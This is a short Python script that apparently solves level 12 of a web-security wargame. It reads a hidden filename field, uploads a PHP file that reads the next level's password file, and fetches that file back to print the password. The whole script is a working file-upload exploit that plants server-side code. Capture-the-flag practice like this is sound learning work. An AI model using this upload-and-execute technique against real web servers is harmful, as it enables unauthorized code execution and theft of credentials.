#!/usr/bin/env python3

import requests
import base64
import re
import tempfile
import urllib.parse

from bs4 import BeautifulSoup
from levels_credentials import credentials, folder

level_url = credentials[12]["url"]
level_username = credentials[12]["level"]
level_password = credentials[12]["password"]

next_level_url = credentials[13]["url"]
next_level_username = credentials[13]["level"]
next_level_pass = folder + next_level_username

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii")}

initial_response = requests.get(level_url, headers=heads)
initial_page = BeautifulSoup(initial_response.text, 'html.parser')
hidden_filename = initial_page.find_all("input")[1].get("value")
filename_list = re.split("\.", hidden_filename)

with tempfile.NamedTemporaryFile(prefix=filename_list[0], suffix=".php") as fp:
    fp.write(b'<?php $myfile = fopen("%s", "r"); echo fgets($myfile); fclose($myfile); ?>' % (next_level_pass.encode("ascii")))
    fp.seek(0)
    files = {"uploadedfile": fp}
    next_data = {"MAX_FILE_SIZE": "1000", "filename":"%s.php" % filename_list[0]}
    next_response = requests.post(level_url, headers=heads, files=files, data=next_data)

next_response_parsed = BeautifulSoup(next_response.text, 'html.parser')
    
evil_file = next_response_parsed.find_all("a")[0].get("href")
evil_file_path = level_url + evil_file

next_pass = requests.get(evil_file_path, headers=heads)
print(next_pass.text.strip())
